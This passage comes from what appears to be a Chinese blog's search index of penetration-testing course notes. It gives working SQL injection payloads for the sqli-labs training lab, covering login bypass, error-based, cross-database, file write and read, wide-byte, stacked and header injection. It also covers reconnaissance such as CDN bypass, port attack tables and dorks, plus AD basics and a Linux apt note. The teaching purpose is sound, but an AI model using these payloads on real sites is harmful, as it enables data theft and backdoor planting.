","date":"2020-02-08","objectID":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/:2:0","tags":["渗透测试"],"title":"05-mysql提交方式注入","uri":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"第三点：实战测试案例-sqlilabs关卡 post登陆框注入-sqlilabs less13 涉及知识点: 万能密码 Less-13 无回显 Less-11 有回显 -- 一般是没有括号的，先手工，再工具试试有没有其他符号干扰 -- 可以用hackbar等进行post参数注入 -- 方法1 ')or 1=1 -- + -- 然后开始按照步骤开始利用 （盲猜 order by 3, 库名，表，列，数据） admin') union select null,database()# -- 这里面没回显数据的 地方，想办法让他报错/工具跑 -- sqlmap post参数是 --data \"\" -- 下面的没成功， 可以再试试 admin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\\ -- 报错注入 admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))# +加号类似空格 http头部注入-sqlilabs less18 $_SERVER() 比如站长之家获取我的浏览器的数据，其中http头部可以修改（你懂得） cookie修改注入-sqlilabs less20 无回显 -- 大概是这样 User-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or ' ","date":"2020-02-08","objectID":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/:3:0","tags":["渗透测试"],"title":"05-mysql提交方式注入","uri":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":" 靶场下载地址：https://github.com/Audi-1/sqli-labs ","date":"2020-02-08","objectID":"/04-mysql%E6%B3%A8%E5%85%A5/:0:0","tags":["渗透测试"],"title":"04-mysql注入","uri":"/04-mysql%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"mysql数据库分层 1.库名，表名，列名，数据库用户等 2.数据库与WEB应用相结合的架构关系 Mysql数据库 数据库A zblog = www.zblog.com 表名 列名 数据 数据库B dede = www.dede.com 表名 列名 数据 PS： 数据库A及B都属于Mysql数据库里面的 数据库用户：管理数据库的用户 级别：管理员用户root 普通用户随机 自带数据库：mysql数据库自带的 mysql注入权限问题 普通用户 （只能靠猜数据进行安全测试） root用户 查询参数： user() database() version() // 查询数据库版本 @@version_compile_os // 操作系统版本 跨库注入 场景: 要渗透B， B没有漏洞，但是A有注入漏洞 -- 1.获取所有的数据库name -- select group_concat(schema_name) from information_schema.schemata; http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata) 2. 再选取某个数据库下面的表 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') 3. 根据表查列 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') 4. 查数据 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users) -- 或者 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 3,1) -- 或者 http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users) sqlLabs 1 -7 练习 ","date":"2020-02-08","objectID":"/04-mysql%E6%B3%A8%E5%85%A5/:0:1","tags":["渗透测试"],"title":"04-mysql注入","uri":"/04-mysql%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"MYSQL高权限注入 mysql跨库注入-已讲 mysql文件操作注入-sqlilabs less7 -- null http://192.168.0.106/Less-7/?id=1')) union select null,null,null --+ --win的路径的话，加2个斜杠防止转义 -- 写入（aaa可以换成后门代码,txt可以换php） （高版本，失败：需要数据库开启secure_file_priv，如果可以执行命令，可以绕过：下来自己查） http://192.168.0.106/Less-7/?id=1')) union select 'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+ -- 自己查资料？？？？？？？？？？ -- 读取文件 http://192.168.0.106/Less-7/?id=1')) union select null,null,load_file('/var/www/html/Less-7/test.txt') --+ -- 路径问题：需要提前得到网站完整路径 -- 路径获取方法： 1.报错显示 inurl:php warning 2.遗留文件 phpinfo()的 server_root。 script_filename 3.漏洞爆路径 discuzz爆路径 4.其他 读取(配合load_file)网站解析配置文件 字典盲猜测fuz： ","date":"2020-02-08","objectID":"/04-mysql%E6%B3%A8%E5%85%A5/:1:0","tags":["渗透测试"],"title":"04-mysql注入","uri":"/04-mysql%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"MYSQL过滤型注入 mysql宽字节绕过注入-sqlilabs less32 宽字节注入条件：数据库编码为GBK等非中文 原理：%5c是反斜杠/ , 而 %df%5c 是一个繁体字（我不会读），所以单引号成功逃逸 $id=check_addslashes($_GET['id']); # 在你输入单引号的时候，自动加\\转义 魔术引号： magic_quote_gpc (php.ini配置文件中), 打开之后，会转义单引号双引号 ------ 和上面的过滤函数有区别 【方法】： %df\" %df' http://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + 其他方法，自己查阅：？？？？？？？？？？ 列举几个常用的URL转码的字符 空格 %20 单引号 %27 # %23 \\ %5C 在PHP中，通过iconv()进行编码转换时，也可能存在宽字节注入漏洞 ","date":"2020-02-08","objectID":"/04-mysql%E6%B3%A8%E5%85%A5/:2:0","tags":["渗透测试"],"title":"04-mysql注入","uri":"/04-mysql%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"MYSQL其他注入 加密编码注入 -sqlilabs less21 (post注入) 先加密，再填写 inurl:MQ= 了解主流加密/编码规律 base64注入攻击 程序代码中使用base64_decode($_GET('id')) 对参数进行解码 对 id' 进行base64编码后为 MSc= ，而%3d是=的url编码， 拼接为 `MCs=%3d` 后尝试； 1 and 1=1 的base64编码为 ，1 and 1=2 的base64编码为 ， 分别放到id=的后门尝试， 结果如果不同，则存在漏洞 继续使用order by 继续 其他利用场景： 过waf， 绕过检测 堆叠查询注入 堆叠查询可以执行多条sql语句，多语句之间使用分号隔开，在第二个sql语句中构造自己要执行的语句 例如： ';select if(substr(user(),1,1)='r', sleep(5),1) -- + -- 一般只会返回第一条sql的执行结果 http://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + -- 所以，在第二条语句中，可以私用update更新数据或者时间盲注获取数据 XFF注入 x-Forwarded-For， 代表客户端真实的ip， 修改后可以伪造客户端ip 将xff头改为:127.0.0.1访问，如果返回正常，分别设置为127.0.0.1' and 1=1# 和127.0.0.1' and 1=2#再次访问 ，根据返回结构判断有没有漏洞 继续使用order by， 而后使用union 127.0.0.1' union select 1,2,3# php中的getenv()函数用于获取一个环境变量的值 ，如果不存在返回false 下次课继续… ","date":"2020-02-08","objectID":"/04-mysql%E6%B3%A8%E5%85%A5/:3:0","tags":["渗透测试"],"title":"04-mysql注入","uri":"/04-mysql%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"基于WEB应用扫描测试 被动式扫描 x-ray （长亭科技开发的） https://xray.cool/xray/#/tutorial/introduce Github: https://github.com/chaitin/xray/releases （国外速度快） 网盘: https://yunpan.360.cn/surl_y3Gu6cugi8u （国内速度快） **主动式扫描 **：工具： awvs（可以录制填写账号密码）、 netsparker、 appscan(特别占用电脑资源) ** 注意验证后扫描 ** 无验证码：模拟登陆 比如 awvs（可以录制填写账号密码） 有验证码：带入cookie 比如 awvs（桌面版：扫描option-\u003ecookie。网页版：custom cookie, 把网页数据包赋值过来） 抓app数据包的差异导致问题：awvs(custome header的添加；旧版：header and cookie) ","date":"2020-02-08","objectID":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/:0:1","tags":["渗透测试"],"title":"03-漏洞发现","uri":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"categories":["渗透测试"],"content":"基于操作系统扫描测试 Nessus Openvas Goby ","date":"2020-02-08","objectID":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/:0:2","tags":["渗透测试"],"title":"03-漏洞发现","uri":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"categories":["渗透测试"],"content":"基于NMAP使用扫描测试 https://blog.csdn.net/qq_29277155/article/details/50977143 ","date":"2020-02-08","objectID":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/:0:3","tags":["渗透测试"],"title":"03-漏洞发现","uri":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"categories":["渗透测试"],"content":"其他安全漏洞扫描补充 未授权访问 中间件安全 逻辑越权问题 更多安全扫描见：https://www.uedbox.com/tools/type/scanner/ 注意：部分漏洞（越权）利用工具无法探针，只能手工 ","date":"2020-02-08","objectID":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/:1:0","tags":["渗透测试"],"title":"03-漏洞发现","uri":"/03-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"categories":["渗透测试"],"content":"1.了解有那些漏洞名称？ sql注入，文件上传，xss跨站，代码执行，命令执行，任意下载，目录遍历，文件泄漏，文件包含，逻辑越权，缓冲区溢出等 2.了解漏洞的产生层面？ web应用，系统层面，第三方软件（数据库,中间件） 告诉大家一个道理： 在web应用或app等其他应用提供服务的同时，其中提供服务的所有对象（如搭建平台，数据库，网站程序，服务器操作系统，用到第三方管理软件等）均存在漏洞的可能性。 3.了解漏洞的影响范围？ 如：注入 有的可以进行文件操作 有的只能获取数据 上传 直接通过上传漏洞成功上传控制后门 告诉大家一个道理： 在做安全测试的时候，测试的目的是否可以根据当前发现的漏洞实现（每个漏洞能造成的危害都不一样，有大有小。） 4.了解目前主流的漏洞？ 5.了解漏洞的发现挖掘？ **黑盒测试：**没源码 其他情况不知道的测试 **白盒测试：**代码审计 源码挖掘漏洞 FUZZ 软件测试 工具： Awvs：web应用一块的 Nmap：全能型的 细分不够 Appscan: web应用一块的 nessus：操作系统一块的 -第三方软件：通过 【端口】 或【 服务 】探针到使用到某些第三方软件，如weblogic或hfs，可以再通过【 漏洞平台 】或 【搜索引擎】 寻找指定漏洞。 exploit-db， seebug等 一些web工具： https://www.uedbox.com/tools/type/webapp/ 6.了解漏洞的利用形式？ 手工操作 工具或脚本实现 编译利用代码实现（二次开发） 漏洞发现问题： 1.登录 ","date":"2020-02-08","objectID":"/02-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB/:0:0","tags":["渗透测试"],"title":"02-漏洞分类","uri":"/02-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB/"},{"categories":["渗透测试"],"content":" 一些web工具： https://www.uedbox.com/tools/type/webapp 1.收集域名信息 Whois查询 在线工具： 爱站网 站长之家 VirusTotal 备案信息查询 ICP备案查询网 天眼查 2.收集敏感信息 Google hacking 常用语法： site: inurl: intext: filetype: intitle: link: info: cache: 缓存 比如：site:edu.cn intext:后台管理 还可以用它来搜集 后台，数据库文件，SQL注入，配置信息，源代码泄露，未授权访问，robots.txt等敏感信息 百度，必应，Yandex, 雅虎，Shodan等类似 3.收集子域名信息 子域名检测工具 工具： Layer子域名挖掘机 (推荐) K8 wydomain Sublist3r (推荐， 能列出多种资源) dnsmaper subDomainsBrute (推荐，python开发的， 可以使用小字典递归地发现三四五级域名) Maltego CE …… 搜索引擎枚举 比如： 搜索百度下面的子域名 site:baidu.com 第三方聚合应用枚举 很多第三方服务汇聚了大量DNS数据集， 可以通过他们检索某个给定域名的子域名 工具： DNSdumpster 网站 在线DNS侦查和搜索的工具 来挖掘制定域潜藏的大量子域 证书透明度(CT)公开日志枚举 是证书授权机构(CA)的一个项目， CA会将每个SSL/TLS证书发布到公共日志中。 一个SSL/TLS证书通常包含域名、子域名、邮件地址 … … 方法： 最简单的就是： 使用搜索引擎搜索一些公开的CT日志 推荐： crt.sh: https://crt.sh 网站 https://censys.io 网站 其他工具： 一些在线网站 子域名爆破网站： https://phpinfo.me/domain IP反查绑定域名网站： https://dns.zizhan.com 4. 收集常用端口信息 方便对症下药 工具： Nmap 无状态扫描工具 Masscan ZMap 御剑高速TCP端口扫描工具 https://www.cnblogs.com/botoo/p/10475402.html 常用端口和攻击方向汇总： 文件共享服务端口 端口号 端口说明 攻击方向 20/21/69 Ftp/Tftp文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 2049 Nfs服务 配置不当 139 Samba 爆破、未授权访问、远程代码执行 389 Ldap目录访问权限 注入、允许匿名访问、弱口令 注：FTP协议的 21端口 –\u003e 传输控制信息， 20端口 —\u003e 传输数据 远程连接服务端口 端口 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门（需Windows Server 2003 及以下系统 ）、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere 抓密码、代码执行 Web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见的web服务端口 Web攻击、爆破、对于服务器版本漏洞 7001/ 7002 WebLogic控制台 Java反序列化、弱口令 8080/8089 JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令 9090 WebSphere控制台 Java反序列化、弱口令 4848 GlassFish 控制台 弱口令 1352 Lotus domino邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口 端口号 端口说明 攻击方向 3306 Mysql 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹Shell 5432 PostgreSQL数据库 爆破、注入、弱口令 28017/27018 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令爆破 5000 SysBase/DB2数据库 爆破、注入 邮件服务端口 端口 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 142 IMAP协议 爆破 网络常见协议端口 端口 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口 端口 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200 Elasticsearch服务 远程执行 11211 Memcache服务 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登录 873 Rsync服务 匿名访问、文件上传 3690 Svn服务 Svn泄露、未授权访问 50000 SAP Mannagement Console 远程执行1 5.指纹识别 应用程序在html, css, js 等文件中多多少少会包含一些特征码（比如: WordPress在robots.txt中会包含wp-admin, 首页index.php中会包含generator=wordpress 3.xx）,帮助快速识别CMS 常见的CMS(整站系统)： Dedecms(织梦) Discuz PHPWEB PHPCMS ECShop Dvbbs SiteWeaver ASPCMS 帝国 Z-Blog WordPress 工具： 御剑Web指纹识别 What Web WEBrOBO 椰树 轻量WEB指纹识别 … 在线网站工具： BugScaner： https://whatweb.bugscaner.com/look/ 云悉指纹： https://www.yunsee.cn/finnger.html What Web: https://whatweb.net/ 推荐项目： https://github.com/Lucifer1993/cmsprint 国内的 https://github.com/anouarbensaad/vulnx 国外的 https://github.com/Lucifer1993/AngelSword 国内的 （停止维护） phpStudy搭建的网站，数据包都有以下特点 Server: Apache/2.4.23 (Win32) OpenSSL/1.0.23 mod_fcgid/2.3.9 6.查找真实IP 如果目标服务器只有一个域名 ，获取真实ip就非常重要 如果没有CDN，可以通过 www.ip138.com等工具获取目标的ip CDN（内容分发网络， 通俗讲就是高速缓存服务器，把内容缓存到了距离我们最近的节点服务器上面…） 判断有无CDN 采用超级ping第三方平台判断：唯一IP无cdn，反之有cdn 或者采用在线网站17CE (https://www17ce.com)进行全国多地区的ping服务器操作 工具： 超级ping 站长工具等 绕过CDN寻找真实IP （1）内部邮箱源 一般邮件系统都在内部，没有经过CDN解析 通过网站注册用户或者RSS订阅功能，查看邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获取真实ip 注意：必须是目标自己的邮件服务器，第三方公共邮件服务器不行 （2）扫描网站测试文件 如：phpinfo, test等一文件，从而找到真实ip （3）分站域名 很多主站访问量大，挂了CDN，但是分站有可能没有CDN 可以通过ping二级域名获取分站ip， 很可能出现分站和主站部署同一个ip，但是在同一个C段下面的情况，从而判断目标的真实ip段 （4）国外访问 较小或者业务面向国内的网站的CDN往往只对国内的用户访问加速，而国外就不一定了 方法： 可以通过挂国外的代理 或者 使用国外的在线代理网站 App Synthetic Monitor (https://asm.ca.com/en/ping.php)访问 可能会得到真实ip （5）查询域名解析记录 也许目标很久之前没有使用CDN 通过网站NETCRAFT （https://www.netcraft.com/）来观察域名的ip历史记录，也可以大致分析出真实ip段 （6）目标有自己的App 可以尝试用Fiddller或Burp Suite 抓取App的请求，从而找到目标的真实ip （7）绕过CloudFlare CDN查找真实IP 很多网站都使用 CloudFlare 提供的cdn服务 可通过在线网站FlareWatch (http://www.crimeflare.us/cfs.html#box) 对CloudFlare客户网站进行真实ip查询 (9) 其他方法 其他方法：遗留文件（比如google镜像），扫全网(比如)，黑暗引擎，dns历史记录（第三方平台，刚好开通cdn之前的ip地址），以量打量（需要肉鸡，cdn的流量用完就显示真实ip） https://get-site-ip.com/ 遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for 【文章：】 https://www.lstazl.com/cdn检测与绕过/ https://w","date":"2020-02-08","objectID":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/:0:0","tags":["渗透测试"],"title":"01-信息搜集","uri":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"categories":["渗透测试"],"content":"shodan ","date":"2020-02-08","objectID":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/:1:0","tags":["渗透测试"],"title":"01-信息搜集","uri":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"categories":["渗透测试"],"content":"zoomeye ","date":"2020-02-08","objectID":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/:2:0","tags":["渗透测试"],"title":"01-信息搜集","uri":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"categories":["渗透测试"],"content":"fofa 利用搜索。或者脚本开发进行批量/调用 伪静态 如果看到一个以.html或者.htm结尾的网页，此时可以通过呢在在地址输入框中输入： javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。 https://blog.csdn.net/Fly_hps/article/details/79487137 https://blog.csdn.net/zezai3010/article/details/78797944 ","date":"2020-02-08","objectID":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/:2:1","tags":["渗透测试"],"title":"01-信息搜集","uri":"/01-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"categories":["Linux"],"content":" DPKG包管理器（本地） ​ dpkg -l 导出软件包，在新系统上安装 dpkg -L xxd 查看某个软件包在电脑上包含哪些文件 dpkg -S /usr/.../man1 看这个文件来自哪个软件包 dpkg -i xxxname_version_架构.deb 安装 // 架构(amd64, i386) dpkg --print-architecture 查看系统的支持的架构 dpkg --print-foreign-architectures 查看系统是否支持其他的架构 cat /var/lib/dpkg/arch 查看系统是否可以拓展支持其他架构类型 可以让系统支持其他类型架构 dpkg --remove-architecture i386 删除支持某个架构 dpkg -r name:amd64 卸载软件包（可以带上架构） 不删除配置文件 dpkg -P name 卸载并删除配置 APT包管理器 # 源文件 cat /etc/apt/sources.list | grep -v ^# 不显示#号开头的 /etc/apt/sources.list.d/ 目录下面是第三方的软件源 sudo apt upgrade # 对已经安装的包更新 sudo apt dist-upgrade # 更新新包，删除旧包（包含内核） sudo apt remove nmap --purge # 删除包和配置文件 -- /var/log/dpkg.log apt list --upgradeable # 查看可以更新的包 apt serach 'network mapper' # 搜索 sudo apt show nmap # 查看软件包详细描述 # 卸载, 卸载完成之后再把不用的autoremove等 sudo apt remove nmap --purge sudo apt purge nmap sudo apt autoremove # 谨慎使用！！！（某系文件可能是旧版内核的依赖包，如果回退老版本可能会出现问题） /var/cache/apt/archives # 下载到这里来了（里面不需要的deb包可以删除。只是下次再次需要的时候重新下载） /var/lib/apt/ # 更新源的索引文件.list # .deb 是打包好的，不显示源代码 apt download nmap # 下载但是不安装(.deb包) apt source asw # 把源代码下载下来，可以可以下载之后自己编译安装 apt showsrc nmap # 查看源代码 自动更新（无人值守） sudo apt install unattended-upgrades # 配置主配置文件 /etc/apt/apt.conf.d/50unattended-upgrades 允许：一般只允许security那个 黑名单： # 配置文件2 /etc/apt/apt.conf.d/10periodic 更新/下载/清除/安装 周期 # 重启服务 sudo service unattended-upgrades restart sudo systemctl restart unattended-upgrades.service # 新版本ubuntu推荐 # 日志 cat /var/log/unattended-upgrades/unattended-upgrades-xxxxxxxx.log sudo lsb_release -a # 查看版本和code_name 无人值守更新通知 # 配置文件 /etc/apt/apt.conf.d/50unattended-upgrades中的mail，指定邮箱 # apticron软件包，用来发邮件的 sudo pt install apticron 多手动练习，少复制 ","date":"2020-02-04","objectID":"/ubuntu-server-%E5%8C%85%E7%AE%A1%E7%90%86/:0:0","tags":["Linux","ubuntu"],"title":"ubuntu server 包管理","uri":"/ubuntu-server-%E5%8C%85%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"APT更新源配置 推荐使用官方更新源 deb 指的是安装包文件 deb-src 是deb相关的，还没有编译成deb的源文件 生产环境中，尽量用前两种类型的 **第三方库 ** apt-key add apt-ket del PPA SNAP包管理 发展趋势非常好 SNAP包管理 可以先安装snap: apt install snap sudo snap find nmap sudo snap install nmap sudo snap remove sudo snap sudo snap refesh nmap # 更新单个软件包 sudo snap refresh # 更新索引文件 # 同时安装多个软件包（彼此独立） # 作为apt的补充 # snap的软件包会下载到一个目录： /snap/bin/... ","date":"2020-02-04","objectID":"/ubuntu-server-%E5%8C%85%E7%AE%A1%E7%90%86/:1:0","tags":["Linux","ubuntu"],"title":"ubuntu server 包管理","uri":"/ubuntu-server-%E5%8C%85%E7%AE%A1%E7%90%86/"},{"categories":["渗透测试"],"content":"基础知识 工作组 类似一个社团，不存在集中管理，无服务机与客户机之分，是对等的 将不同的计算机按功能（或部门）分别列入不同的工作组中 实例：加入/更改/退出 工作组： 计算机- 属性- 计算机名- 更改设置- 工作组更改- （修改名称。若没有这个工作组会新建）- 重启 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:0:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"域 域(Domain) 一个有安全边界的计算机集合（安全边界： 是指在两个域中，一个域中的用户无法访问另一个域中第资源），可以理解为升级版的“工作组” 域控制器(Domain Controller, 简写为DC) 一个域中一个类似管理服务器的计算机，相当于单位的门卫一样，域内电脑如果想互相访问，首先都是经过它的审核 域的分类 单域 （固定位置的小公司。一个yu内要建立至少两个DC，一个作为备份DC） 父域、子域 （比如一个大公司，有分公司；不同地理位置分公司；子公司可以通过自己的域管理自己的资源； 出于安全策略） 域数(tree) 域森林(forest) DNS域名服务器 (实际上，域的name就是DNS域的name； 通常dns服务器与DCS 是一台机器) ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:1:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"活动目录（Active Directory，AD） 是指域环境中提供目录服务的组件。 目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系 人等）的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动 目录实现了目录服务，为企业提供了网络环境的集中式管理机制 活动目录相当于字典的索引，即活动目录里的资源就是字典资源的快捷方式，用户通过寻找快捷方式而定位资源 逻辑结构 组织对象的做法不考虑被管理对象的具体地理位置的组织框架 活动目录的逻辑结构就包括： 组织单元(ou)、域(domain)、域树(tree)、域森林(forest) 在域树内的所有域共享一个活动目录，这个活动目录内的数据分散的存储在各个域内，且每个域只存储该域内的数据。 活动目录主要功能 账号集中管理 软件集中管理 环境集中管理 增强安全性 更可靠 活动目录为Microsoft统一管理的平台 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:2:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"DC与AD最大的区别是： 域控制器（DC）与活动目录（AD）最大的区别是： 如果网络规模较大，就考虑把网络中的众多对象，如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 那么，我们应该把这个数据库放在哪台计算机上呢？用于存储活动目录数据库的计算机称为DC 所以，要实现域环境，其实就是要安装 AD。当内网中的一台计算机上安装了 AD，它就变成 了 DC ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:3:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"安全域 目的： 将一组安全等级相同的计算机划入同一网段内 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:4:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"DMZ “隔离区”， “非军事化分区”， 为了解决安装防火墙后外部网络不能访问内部网络费武器的问题 放置 一些必须公开的服务器设施，比如：企业web服务器、FTP服务器和论坛等 有效的保护了内部网络 DMZ的屏障功能: 内网可以访问外网 内网可以访问DMZ 外网不能访问内网 外网可以访问DMZ DMZ不能访问外网 DMZ不能访问内网 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:5:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"域中计算机分类 域控制器 成员服务器 客户机 独立服务器 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:6:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"内权限解读 域本地组 （来自全林用于本域） 多域用户访问单域资源（访问同一个域），不能嵌套于其他组中，主要是用于授权位于域资源的访问权限 全局组 （来自本域作用于全林） 单域用户访问多域资源（必须是同一个域里面的用户），全局组嵌套在其他组中 通用组 （来自全林作用于全林） 通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。 ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:7:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"A-G-DL-P策略 A - 用户账号 G - 全局组 U - 通用组 DL - 域本地组 P - 资源权限 A-G-DL-P策略 是将用户账号添加到全局组中，讲全局组添加到域本地组中， 